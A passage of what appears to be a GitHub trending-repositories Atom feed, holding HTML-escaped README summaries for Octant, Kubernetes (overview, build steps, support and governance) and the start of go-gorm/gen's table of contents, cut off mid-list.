&lt;code&gt;go run build.go install-test-plugin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Some plugins can be found on GitHub in the &lt;a href=&#34;https://github.com/topics/octant-plugin&#34;&gt;&lt;code&gt;#octant-plugin&lt;/code&gt;&lt;/a&gt; topic (tag).&lt;/p&gt; &#xA;&lt;p&gt;Documentation for plugin components can be found in the &lt;a href=&#34;https://reference.octant.dev/?path=/docs/docs-plugins-1-getting-started--page&#34;&gt;Plugins section&lt;/a&gt; of the documentation.&lt;/p&gt; &#xA;&lt;h2&gt;Discussion&lt;/h2&gt; &#xA;&lt;p&gt;Feature requests, bug reports, and enhancements are welcome. Contributors, maintainers, and users are encouraged to collaborate through these communication channels:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://slack.k8s.io/&#34;&gt;Kubernetes Slack&lt;/a&gt; in the &lt;a href=&#34;https://kubernetes.slack.com/app_redirect?channel=CM37M9FCG&#34;&gt;#octant&lt;/a&gt; channel&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/projectoctant&#34;&gt;Twitter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://groups.google.com/forum/#!forum/project-octant/&#34;&gt;Google group&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vmware-tanzu/octant/issues&#34;&gt;GitHub issues&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Contributors will need to sign a DCO (Developer Certificate of Origin) with all changes. We also ask that a changelog entry is included with your pull request. Details are described in our &lt;a href=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/CONTRIBUTING.md&#34;&gt;contributing&lt;/a&gt; documentation.&lt;/p&gt; &#xA;&lt;p&gt;See our &lt;a href=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/HACKING.md&#34;&gt;hacking&lt;/a&gt; guide for getting your development environment setup.&lt;/p&gt; &#xA;&lt;p&gt;See our &lt;a href=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/ROADMAP.md&#34;&gt;roadmap&lt;/a&gt; for tentative features in a 1.0 release.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;Octant is available under the &lt;a href=&#34;https://raw.githubusercontent.com/vmware-tanzu/octant/master/LICENSE&#34;&gt;Apache License, Version 2.0&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>kubernetes/kubernetes</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/kubernetes/kubernetes</id>
    <link href="https://github.com/kubernetes/kubernetes" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Production-Grade Container Scheduling and Management&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Kubernetes (K8s)&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://pkg.go.dev/k8s.io/kubernetes&#34;&gt;&lt;img src=&#34;https://pkg.go.dev/badge/k8s.io/kubernetes.svg?sanitize=true&#34; alt=&#34;GoPkg Widget&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://bestpractices.coreinfrastructure.org/projects/569&#34;&gt;&lt;img src=&#34;https://bestpractices.coreinfrastructure.org/projects/569/badge&#34; alt=&#34;CII Best Practices&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;img src=&#34;https://github.com/kubernetes/kubernetes/raw/master/logo/logo.png&#34; width=&#34;100&#34;&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Kubernetes, also known as K8s, is an open source system for managing &lt;a href=&#34;https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/&#34;&gt;containerized applications&lt;/a&gt; across multiple hosts. It provides basic mechanisms for deployment, maintenance, and scaling of applications.&lt;/p&gt; &#xA;&lt;p&gt;Kubernetes builds upon a decade and a half of experience at Google running production workloads at scale using a system called &lt;a href=&#34;https://research.google.com/pubs/pub43438.html&#34;&gt;Borg&lt;/a&gt;, combined with best-of-breed ideas and practices from the community.&lt;/p&gt; &#xA;&lt;p&gt;Kubernetes is hosted by the Cloud Native Computing Foundation (&lt;a href=&#34;https://www.cncf.io/about&#34;&gt;CNCF&lt;/a&gt;). If your company wants to help shape the evolution of technologies that are container-packaged, dynamically scheduled, and microservices-oriented, consider joining the CNCF. For details about who&#39;s involved and how Kubernetes plays a role, read the CNCF &lt;a href=&#34;https://cncf.io/news/announcement/2015/07/new-cloud-native-computing-foundation-drive-alignment-among-container&#34;&gt;announcement&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;To start using K8s&lt;/h2&gt; &#xA;&lt;p&gt;See our documentation on &lt;a href=&#34;https://kubernetes.io&#34;&gt;kubernetes.io&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Try our &lt;a href=&#34;https://kubernetes.io/docs/tutorials/kubernetes-basics&#34;&gt;interactive tutorial&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Take a free course on &lt;a href=&#34;https://www.udacity.com/course/scalable-microservices-with-kubernetes--ud615&#34;&gt;Scalable Microservices with Kubernetes&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To use Kubernetes code as a library in other applications, see the &lt;a href=&#34;https://git.k8s.io/kubernetes/staging/README.md&#34;&gt;list of published components&lt;/a&gt;. Use of the &lt;code&gt;k8s.io/kubernetes&lt;/code&gt; module or &lt;code&gt;k8s.io/kubernetes/...&lt;/code&gt; packages as libraries is not supported.&lt;/p&gt; &#xA;&lt;h2&gt;To start developing K8s&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://git.k8s.io/community&#34;&gt;community repository&lt;/a&gt; hosts all information about building Kubernetes from source, how to contribute code and documentation, who to contact about what, etc.&lt;/p&gt; &#xA;&lt;p&gt;If you want to build Kubernetes right away there are two options:&lt;/p&gt; &#xA;&lt;h5&gt;You have a working &lt;a href=&#34;https://golang.org/doc/install&#34;&gt;Go environment&lt;/a&gt;.&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code&gt;mkdir -p $GOPATH/src/k8s.io&#xA;cd $GOPATH/src/k8s.io&#xA;git clone https://github.com/kubernetes/kubernetes&#xA;cd kubernetes&#xA;make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;You have a working &lt;a href=&#34;https://docs.docker.com/engine&#34;&gt;Docker environment&lt;/a&gt;.&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/kubernetes/kubernetes&#xA;cd kubernetes&#xA;make quick-release&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For the full story, head over to the &lt;a href=&#34;https://git.k8s.io/community/contributors/devel#readme&#34;&gt;developer&#39;s documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Support&lt;/h2&gt; &#xA;&lt;p&gt;If you need support, start with the &lt;a href=&#34;https://kubernetes.io/docs/tasks/debug/&#34;&gt;troubleshooting guide&lt;/a&gt;, and work your way through the process that we&#39;ve outlined.&lt;/p&gt; &#xA;&lt;p&gt;That said, if you have questions, reach out to us &lt;a href=&#34;https://git.k8s.io/community/communication&#34;&gt;one way or another&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Community Meetings&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://www.kubernetes.dev/resources/calendar/&#34;&gt;Calendar&lt;/a&gt; has the list of all the meetings in Kubernetes community in a single location.&lt;/p&gt; &#xA;&lt;h2&gt;Adopters&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://kubernetes.io/case-studies/&#34;&gt;User Case Studies&lt;/a&gt; website has real-world use cases of organizations across industries that are deploying/migrating to Kubernetes.&lt;/p&gt; &#xA;&lt;h2&gt;Governance&lt;/h2&gt; &#xA;&lt;p&gt;Kubernetes project is governed by a framework of principles, values, policies and processes to help our community and constituents towards our shared goals.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://github.com/kubernetes/community/raw/master/governance.md&#34;&gt;Kubernetes Community&lt;/a&gt; is the launching point for learning about how we organize ourselves.&lt;/p&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://github.com/kubernetes/steering&#34;&gt;Kubernetes Steering community repo&lt;/a&gt; is used by the Kubernetes Steering Committee, which oversees governance of the Kubernetes project.&lt;/p&gt; &#xA;&lt;h2&gt;Roadmap&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;a href=&#34;https://github.com/kubernetes/enhancements&#34;&gt;Kubernetes Enhancements repo&lt;/a&gt; provides information about Kubernetes releases, as well as feature tracking and backlogs.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>go-gorm/gen</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/go-gorm/gen</id>
    <link href="https://github.com/go-gorm/gen" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Gen: Friendly &amp; Safer GORM powered by Code Generation&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;GORM/GEN&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/go-gorm/gen/raw/master/go.mod&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/go-mod/go-version/go-gorm/gen&#34; alt=&#34;GoVersion&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/go-gorm/gen/releases&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/v/release/go-gorm/gen&#34; alt=&#34;Release&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://pkg.go.dev/gorm.io/gen?tab=doc&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/go.dev-reference-blue?logo=go&amp;amp;logoColor=white&#34; alt=&#34;Go.Dev reference&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://goreportcard.com/report/github.com/go-gorm/gen&#34;&gt;&lt;img src=&#34;https://goreportcard.com/badge/github.com/go-gorm/gen&#34; alt=&#34;Go Report Card&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://opensource.org/licenses/MIT&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-MIT-brightgreen.svg?sanitize=true&#34; alt=&#34;MIT license&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/go-gorm/gen/issues?q=is%3Aopen+is%3Aissue&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/go-gorm/gen&#34; alt=&#34;OpenIssue&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/go-gorm/gen/issues?q=is%3Aissue+is%3Aclosed&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues-closed/go-gorm/gen&#34; alt=&#34;ClosedIssue&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.tickgit.com/browse?repo=github.com/go-gorm/gen&#34;&gt;&lt;img src=&#34;https://badgen.net/https/api.tickgit.com/badgen/github.com/go-gorm/gen&#34; alt=&#34;TODOs&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Gen: Friendly &amp;amp; Safer &lt;a href=&#34;https://github.com/go-gorm/gorm&#34;&gt;GORM&lt;/a&gt; powered by Code Generation.&lt;/p&gt; &#xA;&lt;h2&gt;Multilingual README&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/README.md&#34;&gt;English Version&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/README.ZH_CN.md&#34;&gt;中文版本&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;CRUD or DIY query method code generation&lt;/li&gt; &#xA; &lt;li&gt;Auto migration from database to code&lt;/li&gt; &#xA; &lt;li&gt;Transactions, Nested Transactions, Save Point, RollbackTo to Saved Point&lt;/li&gt; &#xA; &lt;li&gt;Competely compatible with GORM&lt;/li&gt; &#xA; &lt;li&gt;Developer Friendly&lt;/li&gt; &#xA; &lt;li&gt;Multiple Generate modes&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#gormgen&#34;&gt;GORM/GEN&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#multilingual-readme&#34;&gt;Multilingual README&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#overview&#34;&gt;Overview&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#contents&#34;&gt;Contents&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#installation&#34;&gt;Installation&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#quick-start&#34;&gt;Quick start&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#project-directory&#34;&gt;Project Directory&lt;/a&gt;&lt;/li&gt; &#xA;    &lt;/ul&gt; &lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#api-examples&#34;&gt;API Examples&lt;/a&gt; &#xA;    &lt;ul&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#generate&#34;&gt;Generate&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#generate-model&#34;&gt;Generate Model&lt;/a&gt;&lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#data-mapping&#34;&gt;Data Mapping&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#field-expression&#34;&gt;Field Expression&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#create-field&#34;&gt;Create Field&lt;/a&gt;&lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#crud-api&#34;&gt;CRUD API&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#create&#34;&gt;Create&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#create-record&#34;&gt;Create record&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#create-record-with-selected-fields&#34;&gt;Create record with selected fields&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#batch-insert&#34;&gt;Batch Insert&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#query&#34;&gt;Query&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#retrieving-a-single-object&#34;&gt;Retrieving a single object&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#retrieving-objects-with-primary-key&#34;&gt;Retrieving objects with primary key&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#retrieving-all-objects&#34;&gt;Retrieving all objects&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#conditions&#34;&gt;Conditions&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#string-conditions&#34;&gt;String Conditions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#inline-condition&#34;&gt;Inline Condition&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#not-conditions&#34;&gt;Not Conditions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#or-conditions&#34;&gt;Or Conditions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#group-conditions&#34;&gt;Group Conditions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#selecting-specific-fields&#34;&gt;Selecting Specific Fields&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#tuple-query&#34;&gt;Tuple Query&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#json-query&#34;&gt;JSON Query&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#order&#34;&gt;Order&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#limit--offset&#34;&gt;Limit &amp;amp; Offset&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#group-by--having&#34;&gt;Group By &amp;amp; Having&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#distinct&#34;&gt;Distinct&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#joins&#34;&gt;Joins&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#subquery&#34;&gt;SubQuery&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#from-subquery&#34;&gt;From SubQuery&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#update-from-subquery&#34;&gt;Update from SubQuery&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#update-multiple-columns-from-subquery&#34;&gt;Update multiple columns from SubQuery&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#transaction&#34;&gt;Transaction&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#nested-transactions&#34;&gt;Nested Transactions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#transactions-by-manual&#34;&gt;Transactions by manual&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#savepointrollbackto&#34;&gt;SavePoint/RollbackTo&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#advanced-query&#34;&gt;Advanced Query&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#iteration&#34;&gt;Iteration&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#findinbatches&#34;&gt;FindInBatches&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#pluck&#34;&gt;Pluck&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#scopes&#34;&gt;Scopes&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#count&#34;&gt;Count&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#firstorinit&#34;&gt;FirstOrInit&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#firstorcreate&#34;&gt;FirstOrCreate&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#association&#34;&gt;Association&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#relation&#34;&gt;Relation&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#relate-to-exist-model&#34;&gt;Relate to exist model&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#relate-to-table-in-database&#34;&gt;Relate to table in database&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#relate-config&#34;&gt;Relate Config&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#operation&#34;&gt;Operation&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#skip-auto-createupdate&#34;&gt;Skip Auto Create/Update&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#find-associations&#34;&gt;Find Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#append-associations&#34;&gt;Append Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#replace-associations&#34;&gt;Replace Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete-associations&#34;&gt;Delete Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#clear-associations&#34;&gt;Clear Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#count-associations&#34;&gt;Count Associations&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete-with-select&#34;&gt;Delete with Select&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#preloading&#34;&gt;Preloading&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#preload&#34;&gt;Preload&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#preload-all&#34;&gt;Preload All&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#preload-with-select&#34;&gt;Preload with select&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#preload-with-conditions&#34;&gt;Preload with conditions&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#nested-preloading&#34;&gt;Nested Preloading&lt;/a&gt;&lt;/li&gt; &#xA;          &lt;/ul&gt; &lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#update&#34;&gt;Update&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#update-single-column&#34;&gt;Update single column&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#updates-multiple-columns&#34;&gt;Updates multiple columns&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#update-selected-fields&#34;&gt;Update selected fields&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete&#34;&gt;Delete&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete-record&#34;&gt;Delete record&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete-with-primary-key&#34;&gt;Delete with primary key&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#batch-delete&#34;&gt;Batch Delete&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#soft-delete&#34;&gt;Soft Delete&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#find-soft-deleted-records&#34;&gt;Find soft deleted records&lt;/a&gt;&lt;/li&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#delete-permanently&#34;&gt;Delete permanently&lt;/a&gt;&lt;/li&gt; &#xA;        &lt;/ul&gt; &lt;/li&gt; &#xA;      &lt;/ul&gt; &lt;/li&gt; &#xA;     &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#diy-method&#34;&gt;DIY method&lt;/a&gt; &#xA;      &lt;ul&gt; &#xA;       &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#method-interface&#34;&gt;Method interface&lt;/a&gt; &#xA;        &lt;ul&gt; &#xA;         &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#syntax-of-template&#34;&gt;Syntax of template&lt;/a&gt; &#xA;          &lt;ul&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#placeholder&#34;&gt;placeholder&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#template&#34;&gt;template&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#if-clause&#34;&gt;&lt;code&gt;If&lt;/code&gt; clause&lt;/a&gt;&lt;/li&gt; &#xA;           &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/go-gorm/gen/master/#where-clause&#34;&gt;&lt;code&gt;Where&lt;/code&gt; 